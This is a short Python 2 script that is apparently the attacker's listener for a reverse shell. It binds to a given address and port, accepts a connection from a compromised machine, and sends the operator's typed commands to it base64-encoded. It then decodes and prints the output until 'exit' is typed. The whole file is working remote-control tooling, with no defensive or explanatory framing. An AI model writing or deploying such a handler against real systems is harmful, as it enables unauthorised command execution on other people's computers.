from socket import *
import sys
import base64

def revShHandler(ip_addr, port):
	s = socket(AF_INET, SOCK_STREAM)

	s.bind((ip_addr, int(port)))
	
	s.listen(1)

	sock, addr = s.accept()

	print 'Established %s:%s'%addr

	print 'Hint: Type "exit" to kill the connection and the daemon'

	while True:
		try:
			cmd = raw_input('>>> ')
			sock.send(base64.b64encode(cmd))
			sock.send('\r\n')
			if cmd == 'exit':
				raise
			content = ''
			while True:
				temp = sock.recv(1)				
				if temp == '\n':
					break
				content += temp
			print base64.b64decode(content).decode('UTF-8')
		except:
			sock.close()
			s.close()
			break

if __name__ == '__main__':
	revShHandler(ip_addr = sys.argv[1], port = sys.argv[2])
